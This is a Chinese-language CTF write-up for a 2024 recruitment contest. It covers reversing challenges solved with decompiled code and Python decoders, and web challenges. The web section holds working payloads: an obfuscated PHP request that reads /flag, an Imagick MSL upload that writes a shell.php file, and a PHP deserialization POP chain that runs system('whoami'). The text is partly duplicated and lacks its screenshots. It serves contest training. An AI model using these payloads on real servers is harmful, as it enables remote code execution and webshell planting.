# 2024年第四届山石CTF招新赛WP REVERSE&WEB篇

> 原文: https://www.ctfiot.com/199581.html
> ID: 199581

REVERSE

easycpp2

flag: ayyctf{you_get_rand_num}

该程序没有去除符号, 保留了调试符号, 所以直接定位到了main函数:

逻辑不复杂:

__int64 __fastcall main(int argc, const char **argv)
{
  std::
ostream *v2; // rax
  std::
string::
iterator __for_end; // [rsp+20h] [rbp-80h] BYREF
  std::
string::
iterator __for_begin; // [rsp+28h] [rbp-78h] BYREF
  uint8_t data[24]; // [rsp+30h] [rbp-70h]
  std::
string usr_input; // [rsp+50h] [rbp-50h] BYREF
  uint8_t enc_; // [rsp+7Fh] [rbp-21h]
  char *c; // [rsp+80h] [rbp-20h]
  std::
string *__for_range; // [rsp+88h] [rbp-18h]
  int rotate_count; // [rsp+94h] [rbp-Ch]
  int i; // [rsp+98h] [rbp-8h]
  int correct_num; // [rsp+9Ch] [rbp-4h]

  _main();
  correct_num = 0;
  std::
string::
basic_string(&usr_input);
  std::
operator>><char>(refptr__ZSt3cin);
  *(_QWORD *)data = 0xB3B78DA987B3B383ui64;
  *(_QWORD *)&data[8] = 0xA5BEA98B8FBEAB9Fui64;
  *(_QWORD *)&data[16] = 0xBB9BAB9DBE899D83ui64;
  rotate_count = rand() % 7 + 1;
  i = 0;
  __for_range = &usr_input;
  __for_begin._M_current = (char *)std::
string::
begin(&usr_input);
  __for_end._M_current = (char *)std::
string::
end(__for_range);
  while ( __gnu_cxx::
operator!=<char *,std::
string>(&__for_begin, &__for_end) )
  {
    c = __gnu_cxx::
__normal_iterator<char *,std::
string>::
operator*(&__for_begin);
    enc_ = func1(*c, rotate_count);
    if ( enc_ == data[i] )
      ++correct_num;
    ++i;
    __gnu_cxx::
__normal_iterator<char *,std::
string>::
operator++(&__for_begin);
  }
  if ( correct_num == 24 )
    v2 = (std::
ostream *)std::
operator<<<std::
char_traits<char>>(refptr__ZSt4cout, "Correct!");
  else
    v2 = (std::
ostream *)std::
operator<<<std::
char_traits<char>>(refptr__ZSt4cout, "No!");
  refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_(v2);
  std::
string::~string(&usr_input);
  return 0i64;
}

1.首先读入用户输入:

std::
string::
basic_string(&usr_input);
std::
operator>><char>(refptr__ZSt3cin);

2.然后获取一个rotate_count:

rotate_count = rand() % 7 + 1;

3.然后遍历用户输入:

i = 0;
__for_range = &usr_input;
__for_begin._M_current = (char *)std::
string::
begin(&usr_input);
__for_end._M_current = (char *)std::
string::
end(__for_range);
while ( __gnu_cxx::
operator!=<char *,std::
string>(&__for_begin, &__for_end) )
{
  c = __gnu_cxx::
__normal_iterator<char *,std::
string>::
operator*(&__for_begin);
  enc_ = func1(*c, rotate_count);
  if ( enc_ == data[i] )
    ++correct_num;
  ++i;
  __gnu_cxx::
__normal_iterator<char *,std::
string>::
operator++(&__for_begin);
}

4.查看func1函数:

uint8_t __cdecl func1(uint8_t value, uint8_t n)
{
  uint8_t enc_step_one; // [rsp+2Fh] [rbp-1h]

  if ( !n || n > 8u )
    return value;
  enc_step_one = func1_1(value, n);
  return func1_2(enc_step_one, n);
}

uint8_t __cdecl func1_1(uint8_t value, uint8_t shift)
{
  return ((int)value >> shift) | (value << (8 - shift));
}

uint8_t __cdecl func1_2(uint8_t byte, int n)
{
  uint8_t bytea; // [rsp+20h] [rbp+10h]

  bytea = byte;
  if ( ((byte & 1) != 0) != ((((int)byte >> (n - 1)) & 1) != 0) )
    return (1 << (n - 1)) ^ byte ^ 1;
  return bytea;
}

5.解密: 所以逻辑就是将输入的每一个字符进行循环右移rotate_count次然后把第rotate_count位与第1位交换, 然后与data进行比较, 解密则是先交换回去循环左移rotate_count即可:

def circular_left_shift(byte, shift):
    shifted_byte = ((byte << shift) & 0xFF) | (byte >> (8 - shift))
    return shifted_byte

def swap_bits(byte, n):  
    n_index = n - 1 # 将n转换为0到7范围内的索引
  
    # 获取第1位和第n位的值
    bit1 = byte & 1               # 第1位
    bitN = (byte >> n_index) & 1  # 第n位
  
    # 如果两位不同，交换它们
    if bit1 != bitN:
        # 翻转第1位
        byte ^= 1
        # 翻转第n位
        byte ^= (1 << n_index)
  
    return byte

flag = ""
data = [ 0x83, 0xb3, 0xb3, 0x87, 0xa9, 0x8d, 0xb7, 0xb3, 0x9f, 0xab, 0xbe, 0x8f, 0x8b, 0xa9, 0xbe, 0xa5, 0x83, 0x9d, 0x89, 0xbe, 0x9d, 0xab, 0x9b, 0xbb ]
for n in data:
  swap_data = swap_bits(n, 7)
  shift_data = circular_left_shift(swap_data, 7)
  flag += chr(shift_data)
print(flag)
# ayyctf{you_get_rand_num}

File size Ratio Format Name
 -------------------- ------ ----------- -----------
upx: ../finalpack: CantUnpackException: l_info corrupted

Unpacked 1 file: 0 ok, 1 error.

或者直接手脱, 网上关于这类文章很多, 例如这篇(https://xz.aliyun.com/t/6881?time__1311=n4%2BxnD0DRDyBeAK4GNnm00GODgBorD97YD), 就直接F8一路步过, 找到关键点, 直接dump即可。

UPX脱壳如上所示

LEA RDI =>local_68 ,[RBP + -0x60 ]
CALL thunk_FUN_00421290

thunk_FUN_00421290(rdi), 就是字符串, 所以这个函数肯定是strlen 然后用户输入是local_44, 将local_44进了FUN_401830变化后与 “02CD290D5ACE1A83″进行比较, FUN_401830的逻辑:

是将字符串循环右移 那关键在于移动了几轮, 也就是FUN_00401830(local_68, local_44);其中的local_44是多少, 动调即可发现是0xB，写python脚本即可:

def left_rotate_string(s, n):
    return s[n:] + s[:n]

s = "02CD290D5ACE1A83"
n = 0xB
print(left_rotate_string(s, n)) #E1A8302CD290D5AC

<?xml version="1.0" encoding="utf-8" ?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2" />
    </startup>
</configuration>

运行看看, 有个SaveAs按钮:

使用dnSpyEx反编译:

① 将当前字节-1

② 224是11100000, 31是00011111, 所以b=(byte)(((b&224) >> 5)|((b&31)<<3));就是交换其三位和后五位的位置

③ 然后取反。

def decrypt_image_bytes(encrypted_bytes):
    decrypted_bytes = bytearray(len(encrypted_bytes))
  
    for i, b in enumerate(encrypted_bytes):
        b = ~b & 0xFF # 取反
        b = ((b & 0xF8) >> 3) | ((b & 0x7) << 5) # 恢复高低位的顺序
        b = (b + 1) & 0xFF # 加 1
    
        decrypted_bytes[i] = b
  
    return bytes(decrypted_bytes)

with open('enc.png', 'rb') as f:
    encrypted_data = f.read()

decrypted_data = decrypt_image_bytes(encrypted_data)
with open('dec.png', 'wb') as f:
    f.write(decrypted_data)

for (int i = 1; i < a2; i++) {
        a1[i - 1] ^= a1[i];
}

def decrypt(cipher):
    length = len(cipher)
    for i in range(length - 1, 0, -1):
        cipher[i - 1] ^= cipher[i]
    return bytes(cipher).decode('utf-8')

cipher = [0x18, 0x00, 0x1a, 0x17, 0x12, 0x1d, 0x1a, 0x05, 0x0a, 0x56, 0x09, 0x03, 0x5c, 0x0f, 0x12, 0x17, 0x5d, 0x09, 0x02, 0x03, 0x5b, 0x0b, 0x05, 0x5d, 0x08, 0x50, 0x05, 0x5d, 0x08, 0x03, 0x53, 0x13, 0x0f, 0x7d]
plain_text = decrypt(cipher)
print(plain_text)
# ayyctf{adn812nasd9021jad91ad912ar}

web

babycode

POST / HTTP/1.1
Host: xxx.xxx.xxx.xxx:80
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 636

cmd=%24%5f%5f%29%3b%24%5f%5f%3d%2b%2b%24%5f%5f%5f%5f%5f%3b%2d%2d%24%5f%5f%3b%24%5f%5f%5f%5f%5f%3d%28%28%5f%2f%5f%29%2e%27%27%29%7b%24%5f%5f%7d%3b%24%5f%5f%5f%5f%5f%5f%3d%2b%2b%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%3d%24%5f%5f%5f%5f%5f%2e%24%5f%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%3d%27%5f%27%2e%24%5f%5f%5f%5f%3b%24%7b%24%5f%5f%5f%5f%7d%7b%5f%7d%28%24%7b%24%5f%5f%5f%5f%7d%7b%5f%5f%7d%29%3b%2f%2f&_=highlight_file&__=/flag

POST /?class=Imagick&arg=vid:
msl:/tmp/php* HTTP/1.1
Host: localhost:
8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Connection: close Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTrWYaXKoVR1wiLhP
Content-Length: 332

------WebKitFormBoundaryTrWYaXKoVR1wiLhP Content-Disposition: form-data; name="file"; filename="vulhub.msl"
Content-Type: text/plain
<?xml version="1.0" encoding="UTF-8"?>  <read filename="caption:&lt;?=phpinfo();?&gt;"/> <write filename="info:
shell.php" /> 
------WebKitFormBoundaryTrWYaXKoVR1wiLhP--

Net::
__destruct()->Stone::
__toString()->Works::
__call()->Works::
keep()->Net::
__get()->Hill::
__invoke()

<?php
//highlight_file(__FILE__);
//error_reporting(0);
class Hill{

    private $cmd;
    private $content;

    public function __construct($cmd, $content)
    {
        $this->cmd = $cmd;
        $this->content = $content;
    }
    public function __invoke()
    {
        call_user_func($this->cmd, $this->content);
    }
}

class Stone
{
    public $ctf;
    public $game = "good game!";
    // public function __construct($ctf)
    // {
    //     $this->ctf = $ctf;
    // }
    public function __toString()
    {
        return $this->ctf->keep();
    }
    public function keep()
    {
        return $this->ctf . " is " . $this->game;
    }
}

class Net
{
    private $value;
    private $welcome = "Weclome!";
    public $banner = "keep go";
    public $key;
    // public function __construct($key, $value)
    // {
    //     $this->key = $name;
    //     $this->value = $password;
    // }

    public function __set($Attribute, $value){
        $this->$Attribute = $value;
    }

    public function __get($name)
    {
        $value = $this->key;
        $value();
    }
    public function __destruct()
    {
        if ($this->welcome == "go go go!") {
            echo $this->banner;
        } else {
            echo "stop";
        }
    }
    public function hello(){
        echo $welcome;
    }
}
class Works
{
    protected $code;

    //exp
    public function __construct(){
        $this->code = new Net();
        $this->code->key = new Hill("system","whoami");
    }

    public function __call($name, $arguments)
    {
        $num = $name;
        $this->$num();
    }
    private function keep()
    {
        return $this->code->secret;
    }
}
// if (isset($_POST['pop'])) {
//     $a = unserialize($_POST['pop']);
//     $a->hello("welcome");
// } else {
//     die("POST and start");
// } 

$a = new Net();
$a->welcome = "go go go!";
$a->banner = new Stone();
$a->banner->ctf = new Works();

$exp = urlencode(serialize($a));
print_r(str_replace("+","%20",$exp));


```
__int64 __fastcall main(int argc, const char **argv)
{
  std::
ostream *v2; // rax
  std::
string::
iterator __for_end; // [rsp+20h] [rbp-80h] BYREF
  std::
string::
iterator __for_begin; // [rsp+28h] [rbp-78h] BYREF
  uint8_t data[24]; // [rsp+30h] [rbp-70h]
  std::
string usr_input; // [rsp+50h] [rbp-50h] BYREF
  uint8_t enc_; // [rsp+7Fh] [rbp-21h]
  char *c; // [rsp+80h] [rbp-20h]
  std::
string *__for_range; // [rsp+88h] [rbp-18h]
  int rotate_count; // [rsp+94h] [rbp-Ch]
  int i; // [rsp+98h] [rbp-8h]
  int correct_num; // [rsp+9Ch] [rbp-4h]

  _main();
  correct_num = 0;
  std::
string::
basic_string(&usr_input);
  std::
operator>><char>(refptr__ZSt3cin);
  *(_QWORD *)data = 0xB3B78DA987B3B383ui64;
  *(_QWORD *)&data[8] = 0xA5BEA98B8FBEAB9Fui64;
  *(_QWORD *)&data[16] = 0xBB9BAB9DBE899D83ui64;
  rotate_count = rand() % 7 + 1;
  i = 0;
  __for_range = &usr_input;
  __for_begin._M_current = (char *)std::
string::
begin(&usr_input);
  __for_end._M_current = (char *)std::
string::
end(__for_range);
  while ( __gnu_cxx::
operator!=<char *,std::
string>(&__for_begin, &__for_end) )
  {
    c = __gnu_cxx::
__normal_iterator<char *,std::
string>::
operator*(&__for_begin);
    enc_ = func1(*c, rotate_count);
    if ( enc_ == data[i] )
      ++correct_num;
    ++i;
    __gnu_cxx::
__normal_iterator<char *,std::
string>::
operator++(&__for_begin);
  }
  if ( correct_num == 24 )
    v2 = (std::
ostream *)std::
operator<<<std::
char_traits<char>>(refptr__ZSt4cout, "Correct!");
  else
    v2 = (std::
ostream *)std::
operator<<<std::
char_traits<char>>(refptr__ZSt4cout, "No!");
  refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_(v2);
  std::
string::~string(&usr_input);
  return 0i64;
}
std::
string::
basic_string(&usr_input);
std::
operator>><char>(refptr__ZSt3cin);
rotate_count = rand() % 7 + 1;
i = 0;
__for_range = &usr_input;
__for_begin._M_current = (char *)std::
string::
begin(&usr_input);
__for_end._M_current = (char *)std::
string::
end(__for_range);
while ( __gnu_cxx::
operator!=<char *,std::
string>(&__for_begin, &__for_end) )
{
  c = __gnu_cxx::
__normal_iterator<char *,std::
string>::
operator*(&__for_begin);
  enc_ = func1(*c, rotate_count);
  if ( enc_ == data[i] )
    ++correct_num;
  ++i;
  __gnu_cxx::
__normal_iterator<char *,std::
string>::
operator++(&__for_begin);
}
uint8_t __cdecl func1(uint8_t value, uint8_t n)
{
  uint8_t enc_step_one; // [rsp+2Fh] [rbp-1h]

  if ( !n || n > 8u )
    return value;
  enc_step_one = func1_1(value, n);
  return func1_2(enc_step_one, n);
}
uint8_t __cdecl func1_1(uint8_t value, uint8_t shift)
{
  return ((int)value >> shift) | (value << (8 - shift));
}

uint8_t __cdecl func1_2(uint8_t byte, int n)
{
  uint8_t bytea; // [rsp+20h] [rbp+10h]

  bytea = byte;
  if ( ((byte & 1) != 0) != ((((int)byte >> (n - 1)) & 1) != 0) )
    return (1 << (n - 1)) ^ byte ^ 1;
  return bytea;
}
def circular_left_shift(byte, shift):
    shifted_byte = ((byte << shift) & 0xFF) | (byte >> (8 - shift))
    return shifted_byte

def swap_bits(byte, n):  
    n_index = n - 1 # 将n转换为0到7范围内的索引
  
    # 获取第1位和第n位的值
    bit1 = byte & 1               # 第1位
    bitN = (byte >> n_index) & 1  # 第n位
  
    # 如果两位不同，交换它们
    if bit1 != bitN:
        # 翻转第1位
        byte ^= 1
        # 翻转第n位
        byte ^= (1 << n_index)
  
    return byte

flag = ""
data = [ 0x83, 0xb3, 0xb3, 0x87, 0xa9, 0x8d, 0xb7, 0xb3, 0x9f, 0xab, 0xbe, 0x8f, 0x8b, 0xa9, 0xbe, 0xa5, 0x83, 0x9d, 0x89, 0xbe, 0x9d, 0xab, 0x9b, 0xbb ]
for n in data:
  swap_data = swap_bits(n, 7)
  shift_data = circular_left_shift(swap_data, 7)
  flag += chr(shift_data)
print(flag)
# ayyctf{you_get_rand_num}
File size Ratio Format Name
 -------------------- ------ ----------- -----------
upx: ../finalpack: CantUnpackException: l_info corrupted

Unpacked 1 file: 0 ok, 1 error.
LEA RDI =>local_68 ,[RBP + -0x60 ]
CALL thunk_FUN_00421290
def left_rotate_string(s, n):
    return s[n:] + s[:n]

s = "02CD290D5ACE1A83"
n = 0xB
print(left_rotate_string(s, n)) #E1A8302CD290D5AC
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2" />
    </startup>
</configuration>
def decrypt_image_bytes(encrypted_bytes):
    decrypted_bytes = bytearray(len(encrypted_bytes))
  
    for i, b in enumerate(encrypted_bytes):
        b = ~b & 0xFF # 取反
        b = ((b & 0xF8) >> 3) | ((b & 0x7) << 5) # 恢复高低位的顺序
        b = (b + 1) & 0xFF # 加 1
    
        decrypted_bytes[i] = b
  
    return bytes(decrypted_bytes)

with open('enc.png', 'rb') as f:
    encrypted_data = f.read()

decrypted_data = decrypt_image_bytes(encrypted_data)
with open('dec.png', 'wb') as f:
    f.write(decrypted_data)
for (int i = 1; i < a2; i++) {
        a1[i - 1] ^= a1[i];
}
def decrypt(cipher):
    length = len(cipher)
    for i in range(length - 1, 0, -1):
        cipher[i - 1] ^= cipher[i]
    return bytes(cipher).decode('utf-8')

cipher = [0x18, 0x00, 0x1a, 0x17, 0x12, 0x1d, 0x1a, 0x05, 0x0a, 0x56, 0x09, 0x03, 0x5c, 0x0f, 0x12, 0x17, 0x5d, 0x09, 0x02, 0x03, 0x5b, 0x0b, 0x05, 0x5d, 0x08, 0x50, 0x05, 0x5d, 0x08, 0x03, 0x53, 0x13, 0x0f, 0x7d]
plain_text = decrypt(cipher)
print(plain_text)
# ayyctf{adn812nasd9021jad91ad912ar}
POST / HTTP/1.1
Host: xxx.xxx.xxx.xxx:80
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 636

cmd=%24%5f%5f%29%3b%24%5f%5f%3d%2b%2b%24%5f%5f%5f%5f%5f%3b%2d%2d%24%5f%5f%3b%24%5f%5f%5f%5f%5f%3d%28%28%5f%2f%5f%29%2e%27%27%29%7b%24%5f%5f%7d%3b%24%5f%5f%5f%5f%5f%5f%3d%2b%2b%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%3d%24%5f%5f%5f%5f%5f%2e%24%5f%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%3d%27%5f%27%2e%24%5f%5f%5f%5f%3b%24%7b%24%5f%5f%5f%5f%7d%7b%5f%7d%28%24%7b%24%5f%5f%5f%5f%7d%7b%5f%5f%7d%29%3b%2f%2f&_=highlight_file&__=/flag
POST /?class=Imagick&arg=vid:
msl:/tmp/php* HTTP/1.1
Host: localhost:
8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Connection: close Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTrWYaXKoVR1wiLhP
Content-Length: 332

------WebKitFormBoundaryTrWYaXKoVR1wiLhP Content-Disposition: form-data; name="file"; filename="vulhub.msl"
Content-Type: text/plain
<?xml version="1.0" encoding="UTF-8"?>  <read filename="caption:&lt;?=phpinfo();?&gt;"/> <write filename="info:
shell.php" /> 
------WebKitFormBoundaryTrWYaXKoVR1wiLhP--
Net::
__destruct()->Stone::
__toString()->Works::
__call()->Works::
keep()->Net::
__get()->Hill::
__invoke()
<?php
//highlight_file(__FILE__);
//error_reporting(0);
class Hill{

    private $cmd;
    private $content;

    public function __construct($cmd, $content)
    {
        $this->cmd = $cmd;
        $this->content = $content;
    }
    public function __invoke()
    {
        call_user_func($this->cmd, $this->content);
    }
}

class Stone
{
    public $ctf;
    public $game = "good game!";
    // public function __construct($ctf)
    // {
    //     $this->ctf = $ctf;
    // }
    public function __toString()
    {
        return $this->ctf->keep();
    }
    public function keep()
    {
        return $this->ctf . " is " . $this->game;
    }
}

class Net
{
    private $value;
    private $welcome = "Weclome!";
    public $banner = "keep go";
    public $key;
    // public function __construct($key, $value)
    // {
    //     $this->key = $name;
    //     $this->value = $password;
    // }

    public function __set($Attribute, $value){
        $this->$Attribute = $value;
    }

    public function __get($name)
    {
        $value = $this->key;
        $value();
    }
    public function __destruct()
    {
        if ($this->welcome == "go go go!") {
            echo $this->banner;
        } else {
            echo "stop";
        }
    }
    public function hello(){
        echo $welcome;
    }
}
class Works
{
    protected $code;

    //exp
    public function __construct(){
        $this->code = new Net();
        $this->code->key = new Hill("system","whoami");
    }

    public function __call($name, $arguments)
    {
        $num = $name;
        $this->$num();
    }
    private function keep()
    {
        return $this->code->secret;
    }
}
// if (isset($_POST['pop'])) {
//     $a = unserialize($_POST['pop']);
//     $a->hello("welcome");
// } else {
//     die("POST and start");
// } 

$a = new Net();
$a->welcome = "go go go!";
$a->banner = new Stone();
$a->banner->ctf = new Works();

$exp = urlencode(serialize($a));
print_r(str_replace("+","%20",$exp));
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/9-1723798408.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/6-1723798409.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/3-1723798411.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/7-1723798414.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/7-1723798416.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/8-1723798417.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/10-1723798419.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/1-1723798421.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/7-1723798423.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/4-1723798424.png)